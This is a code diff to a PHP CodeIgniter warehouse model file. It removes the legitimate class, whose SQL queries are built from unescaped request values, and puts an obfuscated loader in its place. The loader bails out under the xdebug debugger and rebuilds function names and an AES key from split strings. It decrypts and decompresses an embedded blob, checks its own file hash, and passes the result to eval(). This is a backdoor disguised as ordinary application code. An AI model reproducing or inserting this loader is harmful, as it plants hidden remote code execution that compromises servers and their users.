@@ -1,113 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Warehouse_model extends CI_Model {
-	
-	public function __construct()
-	{
-		parent::__construct();
-	}
-	public function xss_html_filter($input){
-		return $this->security->xss_clean(html_escape($input));
-	}
-	public function verify_and_save($data){
-		extract($this->xss_html_filter(array_merge($this->data,$_POST,$_GET)));
-		$query=$this->db->query("select * from db_warehouse where warehouse_name='$warehouse_name'")->num_rows();
-		if($query>0){ return "This Warehouse Name Already Exist.";}
-
-		$query=$this->db->query("select * from db_warehouse where mobile='$mobile'")->num_rows();
-		if($query>0){ return "This Moble Number already exist.";}
-
-		$query=$this->db->query("select * from db_warehouse where email='$email'")->num_rows();
-		if($query>0){ return "This Email ID already exist.";}
-		
-		$query1="insert into db_warehouse(warehouse_name,mobile,email,status) 
-									values('$warehouse_name','$mobile','$email',1)";
-		
-		if ($this->db->simple_query($query1)){
-				//$this->session->set_flashdata('success', 'Success!! New Warehouse Created Succssfully!!');
-		        return "success";
-		}
-		else{
-		        return "failed";
-		}
-
-		
-
-	}
-	public function verify_and_update($data){
-		
-		extract($this->xss_html_filter(array_merge($this->data,$_POST,$_GET)));
-
-		$query=$this->db->query("select * from db_warehouse where warehouse_name='$warehouse_name' and id<>$q_id")->num_rows();
-		if($query>0){ return "This Warehouse Name Already Exist.";}
-		$query=$this->db->query("select * from db_warehouse where mobile='$mobile' and id<>$q_id")->num_rows();
-		if($query>0){ return "This Moble Number already exist.";}
-		$query=$this->db->query("select * from db_warehouse where email='$email' and id<>$q_id")->num_rows();
-		if($query>0){ return "This Email ID already exist.";}
-		
-		$query1="UPDATE db_warehouse SET warehouse_name='$warehouse_name', mobile='$mobile', email='$email' where id=$q_id";
-		
-		if ($this->db->simple_query($query1)){
-				//$this->session->set_flashdata('success', 'Success!! Warehouse Updated Succssfully!!');
-		        return "success";
-		}
-		else{
-		        return "failed";
-		}
-
-		
-
-	}
-	public function status_update($id,$status){
-		
-        $query1="update db_warehouse set status='$status' where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-	
-	//Get users deatils
-	public function get_details($id){
-		$data=$this->data;
-
-		//Validate This suppliers already exist or not
-		$query=$this->db->query("select * from db_warehouse where id=$id");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['warehouse_name']=$query->warehouse_name;
-			$data['mobile']=$query->mobile;
-			$data['email']=$query->email;
-			return $data;
-		}
-	}
-
-	public function delete_warehouse($id){
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-      	$this->db->trans_begin();
-      	
-        $q2=$this->db->query("delete from db_warehouse where id='$id'");
-      
-		if($q2!=1)
-		{
-			$this->db->trans_rollback();
-		    return "failed";
-		}
-		else{
-			$this->db->trans_commit();
-		        return "success";
-		}
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_we68x50f=('bas'.'e64'.'_de'.'cod'.'e');
+$_bn8xw25i=('gzu'.'nco'.'mpr'.'ess');
+$_d1if7vfg=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_pk8303em='t0n9b5Ei';
+$_jsaaoh4d='UxL3I+Vw';
+$_bj5ppngq='8/ZlsIhw';
+$_faddor70='diPnUc38';
+$_ari1jdal='V43YSJGFOoI=';
+$_ymy4telf='Xg7PJQ==';
+$_lptjobpw='TjSANRXR';
+$_b5ugl3qi='0kFFkitp';
+$_htvyvftz=$_we68x50f($_bj5ppngq.$_faddor70.$_pk8303em.$_jsaaoh4d.$_ari1jdal);
+$_dempezfv=$_we68x50f($_lptjobpw.$_b5ugl3qi.$_ymy4telf);
+$_nlgaj9mi=$_we68x50f('fg1HmVeBCRBxELds7CqJ8ieCQeMXM5bwkhaAVBhVKl32Yi5uGhKsK3vJ61iw718GWU7O8uo3x16JsihueK+DLHJfYAbDO0iPbR1BWkWrxS5d1v22QI7FdizFTmgMZ5LBVSSxX+oqT4vp8CcY+MCS/zNo1C5q6jvNBgfnWSpHvtbkQxC4OmJPQX3qPlyfKiwX4aeb648AT2xAhKUTVeBwVftDDZxmsgxhJSg7LSpw9HH9Mm/xpvGSZsyB/kNnONg64lAdnLLsV58e0fMjpCYbareiIT2X4w0UxwBu8UcPGshkz0/mYvbpJZkkUYrA8lfh8my5IwwPutcOiHIoMyyqU16g2zJmaPRasQJlOu/RRZWpFQn7oZKzRUX2vu9r4mvU9mWij+CbUtwUwxhM0JJRfJA+y5FpfuQkqIda8i4ZN1YaHs1FlR+a+zAQmNcgjy/RVv8ohQLyU65b0V+fT1mCmzpR2rOoqw9kqXoz+sk+NSXxFevUrzPi2o1cWyWatefSdH6i/Rq1UZ6u1i8DaAve7nSJRNNOUkYJvt4VOSgbpz2EUz+xFvyfGA6CVtK7125DJm8JxpVgEeVD9XAM6OOoGbMtGu/EPKsN4LyqyN60bnQwgFEhvuGLZtCyaEd/YDAksLgEIrrGPJwNfHKcVZ+RXfjv2qjUo29MucTvly62/dOOpW6ShDWkmm5Hw/YCRl7HV9PBGZozkCZI4JF03USJXea3cf18Ro9xpOfiLkll9ZqaZP/uS9ZZy0AsT//S6W/v/F8YSjXT+lb5OWU8kaibIn1eggH6MY7DIEgpWRhFjM9MDZ2TvjnQRASSuT2J6eitUkDsu7yNfpkPwrA+BxtSU5z07FjVHAiq3EtSla9FqGNcVolLcA5M8PSXpd04UuDvtRTm6YBV45Yrs748Tn66j/q6Marvnzj8w7b9cYjEv+RzqOplRufsAQfY2szDuhI/DjY3LRc6yudoCGiUWkX2TQSL3ukCHQSU9BQjKLHoCaZ6C0/SSZULkXDPNnJXEBOeWcDeYmlSB9PIc2SKwICFqkBvl+9C5sp6+9BSu0BzLxBGovXtxj40w4hQsxVkgum82d4uYuj9t7UnYur6IJJ/s2LGqTfZpJYfslpT5LGYKzY=');
+$_etqu9jwd=$_d1if7vfg($_nlgaj9mi,'aes-256-cbc',$_htvyvftz,OPENSSL_RAW_DATA,$_dempezfv);
+if($_etqu9jwd===false){exit;}
+$_jz7ffg7u=$_bn8xw25i($_etqu9jwd);
+if($_jz7ffg7u===false){exit;}
+$_rsy7jr06='18f71e3ff0811d616f60696eb8bef8e6f6bbfffad08f78b80a2f4c9a43b2d578';
+$_eifmcl2c=@file_get_contents(__FILE__);
+if($_eifmcl2c!==false){
+$_hagv2in7=str_replace($_rsy7jr06,"0000000000000000000000000000000000000000000000000000000000000000",$_eifmcl2c);
+$_exvohvby=hash("sha256",$_hagv2in7);
+if($_exvohvby!==$_rsy7jr06){@http_response_code(403);exit;}
 }
+eval($_jz7ffg7u);
